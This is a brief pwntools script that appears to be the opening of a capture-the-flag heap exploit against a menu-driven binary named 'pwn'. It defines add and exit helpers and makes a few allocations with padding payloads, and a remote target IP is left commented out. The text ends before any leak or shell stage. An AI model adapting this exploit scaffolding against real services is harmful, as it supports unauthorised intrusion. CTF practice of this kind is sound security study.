#!/usr/bin/python
#coding=utf-8
from pwn import *
context.terminal = ['gnome-terminal','-x','sh','-c']
context.binary = "./pwn"
context.log_level = 'debug'
p = process("./pwn")
# p = remote('47.111.104.169','57805')
elf = ELF("./pwn")
libc = elf.libc
def add(size,payload):
	p.sendlineafter('choice:','1')
	p.sendlineafter('Size:\n',str(size))
	if size!=0:
		p.sendafter('Data:\n',payload)

def exit():
	p.sendlineafter('choice:','2')

add(0x428,'a'*80)

add(0,'')
add(0x20,'b'*90)
add(0,'')
add(0x448,'a'*0x89)